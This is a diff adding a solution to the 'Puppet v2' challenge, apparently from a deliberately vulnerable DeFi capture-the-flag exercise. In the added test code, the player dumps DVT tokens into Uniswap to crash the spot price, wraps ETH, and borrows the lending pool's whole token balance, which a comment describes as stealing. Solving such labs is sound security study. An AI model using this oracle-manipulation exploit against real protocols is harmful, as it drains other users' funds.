@@ -83,6 +83,15 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // send all the dvt tokens to uniswap
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 1, [token.address, weth.address], player.address, (await ethers.provider.getBlock('latest')).timestamp * 2);
+        // convert the ETH to WETH
+        await weth.connect(player).deposit({value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 17n});
+        // steal all the dvt tokens
+        await weth.connect(player).approve(lendingPool.address, await weth.balanceOf(player.address));
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
     });
 
     after(async function () {
